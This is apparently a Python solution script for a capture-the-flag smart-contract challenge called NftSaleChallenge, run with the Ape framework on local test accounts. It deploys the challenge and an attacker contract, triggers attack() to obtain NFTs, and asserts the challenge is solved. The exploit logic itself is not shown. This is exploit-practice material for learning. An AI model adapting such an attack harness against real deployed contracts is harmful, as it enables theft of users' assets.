from ape import accounts, project


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Challenge ---\n")
    challenge = project.NftSaleChallenge.deploy(sender=deployer)

    nft = project.Nft.at(challenge.token())

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.NftSaleAttacker.deploy(
        nft.address,
        sender=attacker,
        value=attacker.balance - 10**18,
    )
    attacker_contract.attack(sender=attacker)

    print(f"\n--- We have {nft.balanceOf(attacker.address)} NFTs! ---\n")

    # --- AFTER EXPLOIT --- #

    assert challenge.isSolved()

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
